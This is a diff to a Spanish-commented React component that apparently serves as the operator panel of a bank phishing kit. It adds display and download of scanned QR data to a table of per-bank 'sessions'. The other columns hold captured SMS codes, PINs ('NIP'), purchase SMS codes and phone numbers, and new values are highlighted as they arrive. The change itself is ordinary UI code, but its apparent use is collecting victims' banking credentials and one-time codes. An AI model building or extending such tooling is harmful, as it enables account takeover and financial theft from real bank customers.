@@ -8,11 +8,16 @@ import { useToast } from '@/hooks/use-toast';
 import { useDeviceInfo } from '@/hooks/use-device-orientation';
 import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
-import { ArrowRight, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download } from 'lucide-react';
+import { ArrowRight, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode } from 'lucide-react';
 import { DeleteConfirmDialog } from './DeleteConfirmDialog';
 
+// Extendemos la interfaz de Session para incluir el campo qrData
+interface SessionWithQR extends Session {
+  qrData?: string;
+}
+
 interface AccessTableProps {
-  sessions: Session[];
+  sessions: SessionWithQR[];
   activeBank: string;
   selectedSessionId: string | null;
   onSelectSession: (sessionId: string) => void;
@@ -36,7 +41,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
   
   // Estado para el diálogo de confirmación de eliminación
   const [isDeleteDialogOpen, setIsDeleteDialogOpen] = useState<boolean>(false);
-  const [sessionToDelete, setSessionToDelete] = useState<Session | null>(null);
+  const [sessionToDelete, setSessionToDelete] = useState<SessionWithQR | null>(null);
   
   // Mutation para guardar una sesión
   const saveSessionMutation = useMutation({
@@ -88,7 +93,52 @@ const AccessTable: React.FC<AccessTableProps> = ({
     : sessions.filter(session => session.banco === activeBank);
     
   // Referencias previas de las sesiones para poder comparar y detectar cambios
-  const [prevSessions, setPrevSessions] = useState<Session[]>([]);
+  const [prevSessions, setPrevSessions] = useState<SessionWithQR[]>([]);
+  
+  // Función para descargar un código QR
+  const handleDownloadQR = (qrData: string) => {
+    try {
+      // Si es una URL de datos (data URL), podemos descargarla directamente
+      if (qrData.startsWith('data:')) {
+        const link = document.createElement('a');
+        link.href = qrData;
+        link.download = `qr_code_${new Date().toISOString().slice(0, 10)}.png`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        
+        toast({
+          title: "Descarga exitosa",
+          description: "El código QR se ha descargado correctamente.",
+          variant: "default",
+        });
+      } 
+      // Si es solo texto, lo convertimos en un archivo de texto
+      else {
+        const blob = new Blob([qrData], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const link = document.createElement('a');
+        link.href = url;
+        link.download = `qr_data_${new Date().toISOString().slice(0, 10)}.txt`;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        
+        toast({
+          title: "Descarga exitosa",
+          description: "Los datos del QR se han descargado como texto.",
+          variant: "default",
+        });
+      }
+    } catch (error) {
+      console.error('Error al descargar QR:', error);
+      toast({
+        title: "Error al descargar",
+        description: "Ha ocurrido un error al descargar el código QR.",
+        variant: "destructive",
+      });
+    }
+  };
   
   // Función para exportar datos a CSV
   const exportToCSV = () => {
@@ -378,6 +428,32 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </div>
                     )}
                     
+                    {/* Mostrar datos QR si existen */}
+                    {session.qrData && (
+                      <div className="mb-2">
+                        <div className="flex gap-1 items-center">
+                          <QrCode className="h-4 w-4 text-[#3af]" />
+                          <div className="text-sm text-[#00ffff] font-bold">
+                            Código QR escaneado
+                          </div>
+                        </div>
+                        <div className="mt-2 flex justify-center">
+                          <Button
+                            variant="outline"
+                            size="sm"
+                            className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2"
+                            onClick={(e) => {
+                              e.stopPropagation(); // Evitar que se seleccione la sesión
+                              handleDownloadQR(session.qrData || '');
+                            }}
+                          >
+                            <Download className="h-4 w-4" />
+                            Descargar QR
+                          </Button>
+                        </div>
+                      </div>
+                    )}
+                    
                     {session.celular && (
                       <div className="mb-2 flex gap-1 items-center">
                         <Smartphone className="h-4 w-4 text-[#888]" />
@@ -456,6 +532,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-3 text-left">SMS</th>
                 <th className="p-3 text-left">NIP</th>
                 <th className="p-3 text-left">SMS COMPRA</th>
+                <th className="p-3 text-left">QR</th>
                 <th className="p-3 text-left">Celular</th>
                 <th className="p-3 text-left">Paso actual</th>
                 <th className="p-3 text-left">Creado por</th>
@@ -507,6 +584,22 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.smsCompra || '--'}
+                  </td>
+                  <td className="p-3">
+                    {session.qrData ? (
+                      <Button
+                        variant="outline"
+                        size="sm"
+                        className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-1"
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          handleDownloadQR(session.qrData || '');
+                        }}
+                      >
+                        <QrCode className="h-3 w-3" />
+                        <span>Descargar</span>
+                      </Button>
+                    ) : '--'}
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.celular || '--'}
